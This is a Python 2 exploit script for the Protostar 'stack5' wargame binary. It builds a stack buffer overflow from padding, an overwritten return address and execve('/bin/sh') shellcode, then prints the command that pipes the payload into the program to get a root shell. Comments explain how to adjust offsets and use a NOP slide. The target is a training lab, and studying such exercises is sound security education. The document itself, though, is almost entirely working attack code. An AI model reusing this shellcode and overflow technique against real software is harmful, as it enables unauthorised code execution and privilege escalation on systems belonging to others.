import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"

#if output is 'Illegal Argument' work with offset and use nopslide (\x90) --> working directory is saved on the stack which can lead to different addresses
eip = struct.pack("I", 0xbffff6b0) #overflow eip at ret instruction with address of stack pointer (esp)

#add payload with shell code opening a root shell (http://shell-storm.org/shellcode/files/shellcode-811.php)
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
#use 'payload = "\xCC"' to test if exploits are working (CC instruction sets breakpoint)

file = open("exp", "w")
file.write(padding + eip + payload)
file.close()

command_line = "(cat exp ; cat) | /opt/protostar/bin/stack5" #pipe input to stack5, shell opens and waits for input because of cat without arguments

print "Use following command to open root shell:"
print command_line
print "Then use 'id' or 'whoami' to verify root"
